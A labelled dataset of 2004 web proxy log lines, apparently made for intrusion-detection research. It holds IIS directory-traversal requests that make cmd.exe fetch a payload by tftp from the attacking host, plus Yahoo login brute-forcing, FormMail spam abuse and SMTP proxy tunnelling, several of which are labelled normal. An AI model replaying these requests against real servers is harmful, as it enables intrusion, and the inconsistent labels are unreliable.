rowIndex, row, class
5929, 68.48.36.59 - - [10/Mar/2004:09:56:51 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5930, 68.82.168.149 - - [10/Mar/2004:09:56:53 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; MSIE 5.5; Windows 95; win9x/NT 4.90 )", n
5931, 68.48.7.157 - - [10/Mar/2004:09:56:55 -0500] "GET /scripts/root.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5932, 68.48.7.157 - - [10/Mar/2004:09:56:56 -0500] "GET /scripts/httpodbc.dll HTTP/1.0" 404 288 "-" "-", m
5933, 67.83.151.132 - - [10/Mar/2004:09:56:56 -0500] "POST http://www.bookloons.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5934, 68.82.168.149 - - [10/Mar/2004:09:56:57 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/5.0 ( compatible; [de]; Windows NT5.0; DigiExt )", n
5935, 68.48.142.117 - - [10/Mar/2004:09:57:02 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5936, 208.190.202.194 - - [10/Mar/2004:09:57:04 -0500] "GET http://l8.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=inoj_&passwd=bmx HTTP/1.0" 200 566 "-" "-", n
5937, 218.11.115.155 - - [10/Mar/2004:09:57:07 -0500] "GET http://www.samair.ru/proxy/proxychecker/results.htm HTTP/1.0" 200 3923 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
5938, 218.11.115.155 - - [10/Mar/2004:09:57:07 -0500] "GET http://www.samair.ru/proxy/proxychecker/results.htm HTTP/1.0" 200 3923 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
5939, 68.82.168.149 - - [10/Mar/2004:09:57:07 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; [fr]; Windows 98; DigiExt )", n
5940, 81.226.199.90 - - [10/Mar/2004:09:57:13 -0500] "POST http://u1.swirve.com/create.cgi HTTP/1.0" 200 5585 "http://games.swirve.com/utopia/newacct.htm" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
5941, 81.226.199.90 - - [10/Mar/2004:09:57:17 -0500] "GET http://u1.swirve.com/getnum.cgi?id=WestonMi HTTP/1.0" 200 4869 "http://u1.swirve.com/create.cgi" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
5942, 213.54.156.103 - - [10/Mar/2004:09:57:21 -0500] "GET http://dieb.webmaster-eye.de/?site=dieb&user=downloadking HTTP/1.1" 200 2417 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
5943, 61.237.215.17 - - [10/Mar/2004:09:57:38 -0500] "POST http://www.gravity-search.net/cgi-bin/smartsearch.cgi HTTP/1.0" 200 531 "http://www.linkou.con.cn" "Mozilla/4.75 [en-us] (Win98; I)", n
5944, 67.83.151.132 - - [10/Mar/2004:09:57:44 -0500] "POST http://www.life-is-more.at/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5945, 68.48.36.59 - - [10/Mar/2004:09:57:44 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5946, 68.48.7.157 - - [10/Mar/2004:09:57:46 -0500] "GET /MSADC/root.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
5947, 68.48.142.117 - - [10/Mar/2004:09:57:52 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5948, 208.190.202.194 - - [10/Mar/2004:09:58:07 -0500] "GET http://l8.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=kellie_&passwd=bmx HTTP/1.0" 200 566 "-" "-", n
5949, 192.117.242.67 - - [10/Mar/2004:09:58:11 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
5950, 67.83.151.132 - - [10/Mar/2004:09:58:13 -0500] "POST http://www.yellowknifedogderby.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5951, 68.82.168.149 - - [10/Mar/2004:09:58:13 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; MSIE 5.01; Windows 95; win9x/NT 4.90 )", n
5952, 61.237.215.17 - - [10/Mar/2004:09:58:14 -0500] "POST http://69.59.175.60/found-best.com/search.php HTTP/1.0" 200 35623 "http://www.linkou.con.cn" "Mozilla/4.5 [en] (Win98; I)", n
5953, 61.237.215.17 - - [10/Mar/2004:09:58:23 -0500] "GET http://69.59.175.60/found-best.com/go.php?bx=hszzhihd&b=hpzhzfhdhphh&k=szshadsaam&u=afsdsc&l=hdzzzmhkshadahaiskzzzozfhfhphdzpzhzchpzshihmzfhnavsfaoafaaaiaaafzdzpzihyhfzzzphdzshxzkzzhvhazozphzzzhzzpzzhhfcdhdpzhzahfzpzahihczdzhhkshadsfszakamszhzshshszanamhhskaasssmaszdzizxhphdzdzshdzdhnsmsfzkhdzvsdahsczdznzzzchfzvsdahamzdavaysfsxaoaxscayscaxsfsvapamscsfsaspsoahsmsoacadsfamaaamsasxhyshszszhfhozpzzhyhyahasahadadaiacsmhosoassaszzmsyssssssaasxszsiahsisoanzoskasadhpaxsdshspssahaiamhpsyasakzxzozkaaszadas&tw=hxzxzahpzchizfzdhnhd&s=assosdsaacszazfi&t= HTTP/1.0" 302 0 "http://69.59.175.60/found-best.com/search.php" "Mozilla/4.5 [en] (Win98; I)", m
5954, 67.83.151.132 - - [10/Mar/2004:09:58:28 -0500] "POST http://www.ishop.co.uk/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5955, 203.121.182.145 - - [10/Mar/2004:09:58:33 -0500] "CONNECT 209.15.20.147:25 HTTP/1.0" 200 - "-" "-", n
5956, 68.48.36.59 - - [10/Mar/2004:09:58:35 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5957, 68.48.36.59 - - [10/Mar/2004:09:58:35 -0500] "GET /c/httpodbc.dll HTTP/1.0" 404 282 "-" "-", m
5958, 67.83.151.132 - - [10/Mar/2004:09:58:39 -0500] "POST http://www.buckhickman.co.uk/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5959, 61.237.215.17 - - [10/Mar/2004:09:58:39 -0500] "GET http://69.59.175.60/found-best.com/go.php?u=afsdsc&l=hdzzzmhkshadahaiskzzzozfhfhphdzpzhzchpzshihmzfhnavsfaoafaaaiaaafzdzpzihyhfzzzphdzshxzkzzhvhazozphzzzhzzpzzhhfcdhdpzhzahfzpzahihczdzhhkshadsfszakamszhzshshszanamhhskaasssmaszdzizxhphdzdzshdzdhnsmsfzkhdzvsdahsczdznzzzchfzvsdahamzdavaysfsxaoaxscayscaxsfsvapamscsfsaspsoahsmsoacadsfamaaamsasxhyshszszhfhozpzzhyhyahasahadadaiacsmhosoassaszzmsyssssssaasxszsiahsisoanzoskasadhpaxsdshspssahaiamhpsyasakzxzozkaaszadas&k=szshadsaam&b=hpzhzfhdhphh&s=assosdsaacszazfi&x=&t=&tw=hxzxzahpzchizfzdhnhd&bx=hszzhihd&f=439b2f79bc341d1a3c1a8013cc2f1302 HTTP/1.0" 302 0 "http://69.59.175.60/found-best.com/search.php" "Mozilla/4.5 [en] (Win98; I)", n
5960, 68.48.7.157 - - [10/Mar/2004:09:58:39 -0500] "GET /MSADC/root.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5961, 68.48.7.157 - - [10/Mar/2004:09:58:39 -0500] "GET /MSADC/httpodbc.dll HTTP/1.0" 404 286 "-" "-", m
5962, 61.237.215.17 - - [10/Mar/2004:09:58:40 -0500] "GET http://69.59.175.60/found-best.com/jump.php?l=hdzzzmhkshadahaiskzzzozfhfhphdzpzhzchpzshihmzfhnavsfaoafaaaiaaafzdzpzihyhfzzzphdzshxzkzzhvhazozphzzzhzzpzzhhfcdhdpzhzahfzpzahihczdzhhkshadsfszakamszhzshshszanamhhskaasssmaszdzizxhphdzdzshdzdhnsmsfzkhdzvsdahsczdznzzzchfzvsdahamzdavaysfsxaoaxscayscaxsfsvapamscsfsaspsoahsmsoacadsfamaaamsasxhyshszszhfhozpzzhyhyahasahadadaiacsmhosoassaszzmsyssssssaasxszsiahsisoanzoskasadhpaxsdshspssahaiamhpsyasakzxzozkaaszadas HTTP/1.0" 200 936 "http://69.59.175.60/found-best.com/search.php" "Mozilla/4.5 [en] (Win98; I)", n
5963, 203.121.182.190 - - [10/Mar/2004:09:58:40 -0500] "\x04\x01" 501 - "-" "-", m
5964, 67.83.151.132 - - [10/Mar/2004:09:58:41 -0500] "POST http://www.uwrf.edu/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5965, 68.48.142.117 - - [10/Mar/2004:09:58:43 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5966, 68.82.168.149 - - [10/Mar/2004:09:58:44 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/5.0 ( compatible; [de]; Windows 95; NetCaptor )", n
5967, 68.82.168.149 - - [10/Mar/2004:09:58:49 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; [en]; Windows 95; MSNIA )", n
5968, 68.82.168.149 - - [10/Mar/2004:09:58:49 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.73 ( compatible; [en]; Windows NT5.0; ezn IE )", n
5969, 68.82.168.149 - - [10/Mar/2004:09:59:04 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; MSIE 5.01; Windows 95; win9x/NT 4.90 )", n
5970, 61.170.192.116 - - [10/Mar/2004:09:59:09 -0500] "GET http://www.bravenet.com/cserv.php?pid=4&tid=1&afilid=3897670613 HTTP/1.0" 200 256 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
5971, 61.170.192.116 - - [10/Mar/2004:09:59:10 -0500] "GET http://images.bravenet.com/bravenet/images/c/bravenet/aff468/20040119-468-bravenet2.gif HTTP/1.0" 200 9068 "http://www.128a.com" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
5972, 208.190.202.194 - - [10/Mar/2004:09:59:11 -0500] "GET http://l9.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=josephc_&passwd=bmx HTTP/1.0" 200 566 "-" "-", n
5973, 68.82.168.149 - - [10/Mar/2004:09:59:22 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/3.01 ( compatible; [fr]; Windows NT4.0; win9x/NT 4.90 )", n
5974, 68.48.36.59 - - [10/Mar/2004:09:59:25 -0500] "GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
5975, 67.83.151.132 - - [10/Mar/2004:09:59:27 -0500] "POST http://www.ec.gc.ca/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5976, 68.48.7.157 - - [10/Mar/2004:09:59:29 -0500] "GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
5977, 67.83.151.132 - - [10/Mar/2004:09:59:30 -0500] "POST http://www.darkbasiccodebase.co.uk/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5978, 68.48.142.117 - - [10/Mar/2004:09:59:33 -0500] "GET /scripts/..%252f../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5979, 67.83.151.132 - - [10/Mar/2004:09:59:33 -0500] "POST http://www.minormonthly.com/cgi-bin/form.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5980, 68.82.168.149 - - [10/Mar/2004:09:59:34 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/5.0 ( compatible; [de]; Windows 95; NetCaptor )", n
5981, 68.82.168.149 - - [10/Mar/2004:09:59:39 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; [en]; Windows 95; MSNIA )", n
5982, 68.82.168.149 - - [10/Mar/2004:09:59:39 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.73 ( compatible; [en]; Windows NT5.0; ezn IE )", n
5983, 68.105.26.80 - - [10/Mar/2004:09:59:52 -0500] "GET http://login.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=kitten_168&passwd=poop HTTP/1.0" 200 566 "-" "-", n
5984, 68.82.168.149 - - [10/Mar/2004:09:59:58 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; ezn IE )", n
5985, 208.190.202.194 - - [10/Mar/2004:10:00:14 -0500] "GET http://l9.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=lady_&passwd=bmx HTTP/1.0" 200 566 "-" "-", n
5986, 67.83.151.132 - - [10/Mar/2004:10:00:15 -0500] "POST http://mark.asci.ncsu.edu/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5987, 68.48.36.59 - - [10/Mar/2004:10:00:15 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5988, 68.82.168.149 - - [10/Mar/2004:10:00:16 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/5.0 ( compatible; [de]; Windows 95; NetCaptor )", n
5989, 68.82.168.149 - - [10/Mar/2004:10:00:16 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.73 ( compatible; [en]; Windows NT5.0; ezn IE )", n
5990, 68.82.168.149 - - [10/Mar/2004:10:00:18 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; [en]; Windows 95; MSNIA )", n
5991, 68.48.7.157 - - [10/Mar/2004:10:00:19 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
5992, 192.117.242.67 - - [10/Mar/2004:10:00:21 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
5993, 68.82.168.149 - - [10/Mar/2004:10:00:24 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.73 ( compatible; [fr]; Windows 95; MSNIA )", n
5994, 192.117.242.67 - - [10/Mar/2004:10:00:27 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
5995, 68.82.168.149 - - [10/Mar/2004:10:00:32 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.7 ( compatible; MSIE 5.01; Windows XP; DigiExt )", n
5996, 68.82.168.149 - - [10/Mar/2004:10:00:32 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.7 ( compatible; MSIE 4.0; Windows NT4.0; DigiExt )", n
5997, 67.83.151.132 - - [10/Mar/2004:10:00:42 -0500] "POST http://www.rebuz.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
5998, 217.136.207.149 - - [10/Mar/2004:10:00:44 -0500] "GET http://havenxxx.com/members/home/index.html HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/4.73 ( compatible; [de]; Windows 98; DigiExt )", n
5999, 217.136.207.149 - - [10/Mar/2004:10:00:46 -0500] "GET http://havenxxx.com/members/home/index.html HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/5.0 ( compatible; MSIE 5.01; Windows NT4.0; DigiExt )", n
6000, 217.136.207.149 - - [10/Mar/2004:10:00:46 -0500] "GET http://havenxxx.com/members/home/index.html HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/4.7 ( compatible; [jp]; Windows NT5.0; FREEI v2.53 )", n
6001, 217.136.207.149 - - [10/Mar/2004:10:00:48 -0500] "GET http://havenxxx.com/members/home/index.html HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/4.6 ( compatible; MSIE 5.0; Windows XP; DigiExt )", n
6002, 217.136.207.149 - - [10/Mar/2004:10:00:49 -0500] "GET http://havenxxx.com/members/home/index.html HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/5.0 ( compatible; [dk]; Windows NT5.0; DigiExt )", n
6003, 217.136.207.149 - - [10/Mar/2004:10:00:50 -0500] "GET http://havenxxx.com/members/home/index.html HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/3.01 ( compatible; MSIE 4.0; Windows NT5.0; DigiExt )", n
6004, 217.136.207.149 - - [10/Mar/2004:10:00:56 -0500] "GET http://havenxxx.com/members/home/index.html HTTP/1.0" 200 566 "http://www.clubsandy.com/" "Mozilla/3.01 ( compatible; MSIE 4.0; Windows XP; NetCaptor )", n
6005, 68.48.36.59 - - [10/Mar/2004:10:01:06 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
6006, 81.226.199.90 - - [10/Mar/2004:10:01:07 -0500] "POST http://u1.swirve.com/create.cgi HTTP/1.0" 200 1795 "http://u1.swirve.com/create.cgi" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
6007, 68.82.168.149 - - [10/Mar/2004:10:01:07 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/5.0 ( compatible; [de]; Windows 95; NetCaptor )", n
6008, 67.83.151.132 - - [10/Mar/2004:10:01:07 -0500] "POST http://216.156.110.20/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
6009, 68.48.7.157 - - [10/Mar/2004:10:01:09 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
6010, 81.226.199.90 - - [10/Mar/2004:10:01:09 -0500] "POST http://u1.swirve.com/create.cgi HTTP/1.0" 200 613 "http://games.swirve.com/utopia/newacct.htm" "Mozilla/4.03 (X11; I; SunOS 5.5 sun4m)", n
6011, 67.83.151.132 - - [10/Mar/2004:10:01:18 -0500] "POST http://www.darkbasiccodebase.co.uk/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
6012, 67.83.151.132 - - [10/Mar/2004:10:01:19 -0500] "POST http://www.sleepeducationandresearch.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
6013, 208.190.202.194 - - [10/Mar/2004:10:01:20 -0500] "GET http://l10.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=l_i_z_a_&passwd=bmx HTTP/1.0" 200 566 "-" "-", n
6014, 212.160.136.163 - - [10/Mar/2004:10:01:34 -0500] "GET http://seek99.com/search.htm?aid=19448&keywords=electronics HTTP/1.0" 200 23421 "http://www.dogs.homerescue.org/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
6015, 212.160.136.163 - - [10/Mar/2004:10:01:38 -0500] "GET http://seek99.com/go2.htm?a=%14%8C%EC%1E%18&bid=assyaaaaaaav&url=http%3A%2F%2F66.77.183.138%2FSearch%3Ffig%3D3157%26evid%3DCE0069d23c83%26eng%3DLooksmart-03-2002%26cb%3DSeek99%26dest%3Dhttp%253A%252F%252Fwww.looksmart.com%252Fog%252Fpr%253DPsr%253Bro%253D3%253Brc%253D4%253Bla%253D183291%253Blm%253D224276%253Bli%253D100888662%253Bed%253D20040217%253Bii%253D803f.62eb.404f2dca.26a8%253Bpn%253D%253Bto%253D%253Btc%253D4%253Bpo%253D3%253Bpc%253D15%253Bpi%253Dzag1%253Bts%253D%257Chttp%253A%252F%252Fwww.crutchfield.com%252Fi-rlooc266%252Foutlet%252F%26engid%3D1675%26gid%3D4040%26af%3D0%26qtype%3D0%26qw%3Delectronics%26ts%3D1078930889%26cs%3Dfb872%2F2 HTTP/1.0" 200 566 "http://seek99.com/search.htm?aid=19448&keywords=electronics" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
6016, 68.82.168.149 - - [10/Mar/2004:10:01:46 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.0 ( compatible; [en]; Windows 95; win9x/NT 4.90 )", n
6017, 67.83.151.132 - - [10/Mar/2004:10:01:49 -0500] "POST http://www.caironet.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
6018, 218.78.209.42 - - [10/Mar/2004:10:01:52 -0500] "CONNECT 209.15.20.17:25 HTTP/1.0" 200 - "-" "-", n
6019, 67.83.151.132 - - [10/Mar/2004:10:01:52 -0500] "POST http://www.factoryskatepark.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
6020, 68.48.36.59 - - [10/Mar/2004:10:01:59 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.36.59%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
6021, 68.48.7.157 - - [10/Mar/2004:10:01:59 -0500] "GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.7.157%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
6022, 68.48.7.157 - - [10/Mar/2004:10:02:00 -0500] "GET /c/httpodbc.dll HTTP/1.0" 404 282 "-" "-", m
6023, 67.83.151.132 - - [10/Mar/2004:10:02:00 -0500] "POST http://www.fb10.uni-bremen.de/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
6024, 68.48.36.59 - - [10/Mar/2004:10:02:03 -0500] "GET /d/httpodbc.dll HTTP/1.0" 404 282 "-" "-", m
6025, 68.82.168.149 - - [10/Mar/2004:10:02:06 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/5.0 ( compatible; MSIE 4.01; Windows 95; ezn IE )", n
6026, 67.83.151.132 - - [10/Mar/2004:10:02:10 -0500] "POST http://www.primarymonitor.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
6027, 68.82.168.149 - - [10/Mar/2004:10:02:17 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.6 ( compatible; MSIE 4.0; Windows XP; DigiExt )", n
6028, 208.190.202.194 - - [10/Mar/2004:10:02:24 -0500] "GET http://l10.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=faroo_&passwd=bmx HTTP/1.0" 200 566 "-" "-", n
6029, 217.208.64.55 - - [10/Mar/2004:10:02:27 -0500] "HEAD http://xxxkiki.com/members/ HTTP/1.0" 200 0 "http://xxxkiki.com/members/" "Mozilla/4.7 ( compatible; [dk]; Windows NT4.0; DigiExt )", n
6030, 68.82.168.149 - - [10/Mar/2004:10:02:36 -0500] "GET http://www.proteen.com/members/index.htm HTTP/1.0" 200 566 "http://www.proteen.com/members/index.htm" "Mozilla/4.0 ( compatible; [en]; Windows 95; win9x/NT 4.90 )", n
